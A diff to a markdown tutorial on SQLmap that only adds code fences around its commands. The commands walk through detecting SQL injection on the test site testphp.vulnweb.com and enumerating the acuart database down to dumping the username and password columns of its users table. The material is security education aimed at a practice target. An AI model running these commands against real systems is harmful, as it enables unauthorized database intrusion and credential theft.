@@ -50,10 +50,12 @@ sudo apt install sqlmap
 
 Alternatively, clone the repository from GitHub and run it with Python:
 
-bash
+```bash
 git clone https://github.com/sqlmapproject/sqlmap.git
 cd sqlmap
 python sqlmap.py
+```
+
 
 
 For basic usage, use sqlmap -u <URL> to test a URL, with flags like --dbs to list databases or --dump to extract data.
@@ -67,14 +69,16 @@ This guide provides a structured approach to detecting and exploiting SQL inject
 ### Step 1: Running SQLmap on the Vulnerable Endpoint
 Target a potentially vulnerable endpoint, such as:
 
-bash
+```bash
 http://testphp.vulnweb.com/artists.php?artist=1
-
+```
 
 Run SQLmap to check for vulnerabilities:
 
-bash
+```bash
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
+```
+
 
 
 - -u: Specifies the target URL.
@@ -118,8 +122,10 @@ Focus on the application-specific database, acuart.
 ### Step 4: Listing Tables in a Database
 Enumerate tables in the acuart database:
 
-bash
+```bash
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
+```
+
 
 
 Example output:
@@ -144,8 +150,10 @@ The users table is a likely target for sensitive data.
 ### Step 5: Listing Columns in a Table
 Retrieve columns from the users table:
 
-bash
+```bash
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+```
+
 
 
 Example output:
@@ -173,8 +181,10 @@ Columns like uname (username) and pass (password) are of interest.
 ### Step 6: Dumping Data from a Table
 Extract data from specific columns:
 
-bash
+```bash
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname,pass --dump --batch
+```
+
 
 
 Example output:
